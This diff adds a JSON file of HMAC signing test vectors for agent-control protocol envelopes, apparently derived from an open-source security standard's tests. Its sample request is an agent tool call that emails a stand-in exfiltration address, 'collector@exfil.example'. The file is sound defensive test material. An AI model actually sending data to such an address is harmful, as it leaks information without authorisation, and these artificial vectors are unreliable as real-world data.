@@ -1,0 +1,60 @@
+{
+  "source": "GenAI-Security-Project/agent-control-standard (Apache-2.0), commit 02b24e7c1398794957f8b54ceed0c8a54292706f, adapters/tests/core/test_signing_vectors.py; request and all three hand-written canonical inputs reused. Result/error HMACs independently calculated with Python stdlib hmac/hashlib.sha256 over those literal inputs, key bytes(range(32)). Minimal envelopes test crypto, not schema validity.",
+  "keyHex": "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f",
+  "vectors": [
+    {
+      "name": "request",
+      "envelope": {
+        "params": {
+          "acs_version": "0.1.0",
+          "metadata": {
+            "agent_id": "finbot",
+            "session_id": "0f8fad5b-d9cb-469f-a165-70867728950e"
+          },
+          "payload": {
+            "arguments": {
+              "to": {
+                "value": [
+                  "collector@exfil.example"
+                ]
+              }
+            },
+            "tool": {
+              "name": "finmail__send_email"
+            }
+          },
+          "request_id": "5b0d7c3e-2f0a-4d4e-9a51-0c6f3c1e8a42"
+        },
+        "method": "steps/toolCallRequest",
+        "jsonrpc": "2.0",
+        "id": "5b0d7c3e-2f0a-4d4e-9a51-0c6f3c1e8a42"
+      },
+      "canonical": "{\"id\":\"5b0d7c3e-2f0a-4d4e-9a51-0c6f3c1e8a42\",\"jsonrpc\":\"2.0\",\"method\":\"steps/toolCallRequest\",\"params\":{\"acs_version\":\"0.1.0\",\"metadata\":{\"agent_id\":\"finbot\",\"session_id\":\"0f8fad5b-d9cb-469f-a165-70867728950e\"},\"payload\":{\"arguments\":{\"to\":{\"value\":[\"collector@exfil.example\"]}},\"tool\":{\"name\":\"finmail__send_email\"}},\"request_id\":\"5b0d7c3e-2f0a-4d4e-9a51-0c6f3c1e8a42\"}}",
+      "hmac": "JKeQYZNdfA3Qfu4AuzJjNZnHmnpULZlQ5rNGQF2KFxc="
+    },
+    {
+      "name": "result",
+      "envelope": {
+        "result": {
+          "decision": "allow"
+        },
+        "jsonrpc": "2.0",
+        "id": "1"
+      },
+      "canonical": "{\"id\":\"1\",\"jsonrpc\":\"2.0\",\"result\":{\"decision\":\"allow\"}}",
+      "hmac": "xQ1t5p0GmPVLPlRn2ZcXc4WtihgHFaBFsTISdxmqyVU="
+    },
+    {
+      "name": "error",
+      "envelope": {
+        "jsonrpc": "2.0",
+        "id": "1",
+        "error": {
+          "code": -32000
+        }
+      },
+      "canonical": "{\"error\":{\"code\":-32000},\"id\":\"1\",\"jsonrpc\":\"2.0\"}",
+      "hmac": "txTex7yu1ONxEDUDaPEGVwYhSAbYqw1l4CX3sk6Ly/g="
+    }
+  ]
+}
